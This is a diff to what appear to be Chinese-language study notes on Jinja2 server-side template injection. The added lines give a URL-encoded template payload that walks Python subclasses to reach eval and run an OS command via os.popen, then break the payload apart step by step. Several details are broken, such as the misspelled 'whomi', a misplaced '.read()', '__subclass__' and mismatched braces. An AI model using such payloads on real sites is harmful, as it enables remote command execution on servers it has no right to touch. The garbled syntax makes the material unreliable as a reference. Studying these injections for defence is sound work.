@@ -537,6 +537,22 @@ for c in().__class__.__base__[0].__subclass__():
     c.__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")
 
 再将其转为Jinja2语法格式，在每个语句的开始和结束处使用{{%%}}括起来
+
+{%%20for%20c%20in%20[].__class__.__base__.__subclass__()%20%}%20{%' \
+'%20if%20c.__name__==%27_IterationGuard%27%20%}%20{{%20c.__init__.__globals__[%27__builtins__%27]' \
+'[%27eval%27]("__import__(%27os%27).popen(%27whomi%27.read()")%20%%}%20{%%20endif%20%}%20{%' \
+'%20endfor%20%}
+
+//拆解
+%20{{%20c.__init__.__globals__[%27__builtins__%27][%27eval%27]("__import__(%27os%27).popen(%27whomi%27.read()")%20%%}%20{%%20endif%20%}%20{%%20endfor%20%}
+//再拆解
+%20{{%20  %20%%}  %20{%%20endif%20%}%20{%%20endfor%20%}
+//再拆解
+{{  %%}
+
+[1]在{{  %%}这里面的是c.__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")
+
+[2].system('whoami')") ---> .popen(%27whomi%27.read()")
 ----------------------------------------------------------------------------
 
 </details>
